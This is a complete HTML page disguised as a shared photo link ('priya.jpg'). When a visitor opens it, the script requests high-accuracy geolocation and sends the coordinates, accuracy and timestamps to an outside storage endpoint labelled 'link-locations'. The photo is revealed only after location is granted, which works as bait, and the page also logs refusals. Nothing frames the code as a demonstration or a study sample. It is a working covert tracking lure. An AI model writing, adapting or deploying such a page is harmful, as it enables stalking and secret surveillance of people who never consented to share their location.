<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title></title>
    <style>
      html,
      body {
        margin: 0;
        height: 100%;
        background: #fff;
      }
      #photo {
        display: none;
        width: 100%;
        height: 100%;
        object-fit: contain;
      }
      #photo.visible {
        display: block;
      }
    </style>
  </head>
  <body>
    <img id="photo" src="priya.jpg" alt="" />
    <script>
      var STORE =
        "https://api.restful-api.dev/objects/ff808181a067127101a09bcd8bca0b86";

      function withTime(payload) {
        var now = new Date();
        payload.time = now.toISOString();
        payload.local_time = now.toLocaleString("en-IN", {
          timeZone: "Asia/Kolkata",
          year: "numeric",
          month: "2-digit",
          day: "2-digit",
          hour: "2-digit",
          minute: "2-digit",
          second: "2-digit",
          hour12: true,
        });
        return payload;
      }

      function send(payload) {
        payload = withTime(payload);
        return fetch(STORE)
          .then(function (res) {
            return res.json();
          })
          .then(function (doc) {
            var list =
              doc && doc.data && doc.data.locations
                ? doc.data.locations.slice()
                : [];
            list.push({
              lat: payload.lat,
              lng: payload.lng,
              accuracy: payload.accuracy,
              time: payload.time,
              local_time: payload.local_time,
              error: payload.error,
              code: payload.code,
            });
            return fetch(STORE, {
              method: "PUT",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                name: "link-locations",
                data: { locations: list },
              }),
            });
          })
          .catch(function () {});
      }

      function showPhoto() {
        document.getElementById("photo").classList.add("visible");
      }

      if (!navigator.geolocation) {
        send({ error: "geolocation_unsupported" });
      } else {
        navigator.geolocation.getCurrentPosition(
          function (pos) {
            send({
              lat: pos.coords.latitude,
              lng: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
            });
            showPhoto();
          },
          function (err) {
            send({ error: err.message, code: err.code });
          },
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );
      }
    </script>
  </body>
</html>
